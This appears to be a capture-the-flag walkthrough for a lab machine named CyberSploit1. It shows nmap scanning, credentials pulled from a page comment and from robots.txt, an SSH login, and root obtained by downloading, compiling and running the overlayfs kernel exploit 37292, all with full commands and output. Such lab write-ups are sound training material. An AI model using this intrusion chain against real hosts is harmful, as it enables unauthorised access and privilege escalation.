# IP: 192.168.114.92

# NMAP
```javascript
┌──(dx㉿kali)-[~]
└─$ nmap 192.168.114.92                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 00:09 EDT
Nmap scan report for 192.168.114.92
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 71.70 seconds

```


# NMAP-ADVANCED

```javascript
┌──(dx㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 192.168.114.92             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 00:20 EDT
Nmap scan report for 192.168.114.92
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hello Pentester!
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.43 seconds

```
# Navigating to port 80

![webpage-cyberexploit1-provingground](https://user-images.githubusercontent.com/98345027/187831328-7645fb3a-2d59-4654-a305-02985d8561db.png)


# Source-page of a website
![page-source-cyberexploit1-provingground](https://user-images.githubusercontent.com/98345027/187831603-ad0dada0-3713-488f-854e-4b8d91b006c4.png)


# Findings

```javascript
From Port-80: It Reaveal username:" username:itsskv--------" in the comment section
```

# Visiting the Robots.txt
![webpage-robots-provingground](https://user-images.githubusercontent.com/98345027/187832073-6f30f5f1-643b-4cce-990f-f55dcfd9dcd9.png)

# Findings from Robots.txt
```javascript
Base64: Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
-----------------------------------------------------------------------------
After Decoding by the following command
┌──(dx㉿kali)-[~]
└─$ echo "Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=" | base64 -d
cybersploit{youtube.com/c/cybersploit}                             
------------------------------------------------------------------------------
```

# Steps
```javascript
1. Now we got the username: itsskv
2.After decoding the base64 text we got: cybersploit{youtube.com/c/cybersploit}  
3.Lets try to ssh to the box by the following command
4.Command: ssh itsskv@192.168.114.92
5.And In the Password Section try the above decoded text: cybersploit{youtube.com/c/cybersploit} 
```

# SSH To a Box
```python
                                                                              
┌──(dx㉿kali)-[~]
└─$ ssh itsskv@192.168.114.92
itsskv@192.168.114.92's password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Your Hardware Enablement Stack (HWE) is supported until April 2017.

itsskv@cybersploit-CTF:~$ id
uid=1001(itsskv) gid=1001(itsskv) groups=1001(itsskv)
itsskv@cybersploit-CTF:~$ whoami
itsskv
itsskv@cybersploit-CTF:~$ ls -la
total 156
drwxr-xr-x 20 itsskv itsskv  4096 Sep  4  2020 .
drwxr-xr-x  4 root   root    4096 Jun 25  2020 ..
-rw-------  1 itsskv itsskv     0 Sep  4  2020 .bash_history
-rw-r--r--  1 itsskv itsskv   220 Jun 25  2020 .bash_logout
-rw-r--r--  1 itsskv itsskv  3486 Jun 25  2020 .bashrc
drwx------ 14 itsskv itsskv  4096 Jun 25  2020 .cache
drwx------  9 itsskv itsskv  4096 Jun 25  2020 .config
drwx------  3 itsskv itsskv  4096 Jun 25  2020 .dbus
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Desktop
-rw-r--r--  1 itsskv itsskv    25 Jun 26  2020 .dmrc
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Documents
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Downloads
-rw-r--r--  1 itsskv itsskv  8445 Jun 25  2020 examples.desktop
-rw-rw-r--  1 itsskv itsskv    32 Sep  3  2020 flag2.txt
drwx------  3 itsskv itsskv  4096 Jun 26  2020 .gconf
drwx------  4 itsskv itsskv  4096 Jun 25  2020 .gnome2
-rw-rw-r--  1 itsskv itsskv   142 Jun 26  2020 .gtk-bookmarks
drwx------  2 itsskv itsskv  4096 Jun 25  2020 .gvfs
-rw-------  1 itsskv itsskv  1062 Jun 26  2020 .ICEauthority
drwxr-xr-x  3 itsskv itsskv  4096 Jun 25  2020 .local
-rw-r--r--  1 itsskv itsskv    33 Sep  1 09:39 local.txt
drwx------  3 itsskv itsskv  4096 Jun 25  2020 .mission-control
drwx------  4 itsskv itsskv  4096 Jun 25  2020 .mozilla
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Music
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Pictures
-rw-r--r--  1 itsskv itsskv   675 Jun 25  2020 .profile
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Public
drwx------  2 itsskv itsskv  4096 Jun 26  2020 .pulse
-rw-------  1 itsskv itsskv   256 Jun 25  2020 .pulse-cookie
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Templates
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Videos
-rw-------  1 itsskv itsskv     0 Jun 26  2020 .Xauthority
-rw-------  1 itsskv itsskv 12288 Jun 26  2020 .xsession-errors
-rw-------  1 itsskv itsskv 13525 Jun 26  2020 .xsession-errors.old
itsskv@cybersploit-CTF:~$ 
```

# Getting a user flag
```python
itsskv@cybersploit-CTF:~$ cat local.txt
d35ac9e5b9cbb7821427eed8fb664da0
```

# Escalation
```python
# Local Enumeration
------------------------------------------------------
Note: Checking the Kernel Version of the target
------------------------------------------------------
itsskv@cybersploit-CTF:~$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux
```

# Findings
```python
Researching more about the kernel version we get to know that the target is vulnerable to overlayfs local priviledge escalation
Reference: https://www.exploit-db.com/exploits/37292
```
# Searchsploit
```python
┌──(dx㉿kali)-[~]
└─$ searchsploit 3.13.0           
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14 | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14 | linux/local/37293.txt
-------------------------------------------- ---------------------------------
Shellcodes: No Results
```

# Linux Kernel Exploit
```python
1. First we have to download the exploit(https://www.exploit-db.com/exploits/37292)
2. Now start the python server where you have downloaded the file by the following command: sudo python3 -m http.server 80
3. find the ip address of your machine by command: ifconfig
4. Now we download that file to our target machine by moving to /tmp directory, by the following command.(wget http://192.168.49.114/37292.c
)
```
# Downloading our exploit to Our Target machine
```python
itsskv@cybersploit-CTF:~$ cd /tmp
itsskv@cybersploit-CTF:/tmp$ wget http://192.168.49.114/37292.c
--2022-09-01 10:45:09--  http://192.168.49.114/37292.c
Connecting to 192.168.49.114:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: `37292.c'

100%[=======================================================================================================>] 5,119       --.-K/s   in 0.01s   

2022-09-01 10:45:09 (349 KB/s) - `37292.c' saved [5119/5119]

itsskv@cybersploit-CTF:/tmp$ ls
37292.c  at-spi2  pulse-Pa7SbdbpeExT  unity_support_test.1  vmware-root
itsskv@cybersploit-CTF:/tmp$ 
```
# Next We can compile the source code
```python
itsskv@cybersploit-CTF:/tmp$ gcc 37292.c -o 37292
```
# Finally Runnning the Exploit
```python
itsskv@cybersploit-CTF:/tmp$ ./37292
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# 
```

# Finally We are able to exploit the kernel Version and obtain an Elevated Shell
```python
itsskv@cybersploit-CTF:/tmp$ ./37292
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id    
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
# whoami
root
# 
# cd /root
# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  finalflag.txt  proof.txt
# cat proof.txt
75b68844f4364bae7580faa1b84aafca
# 

```

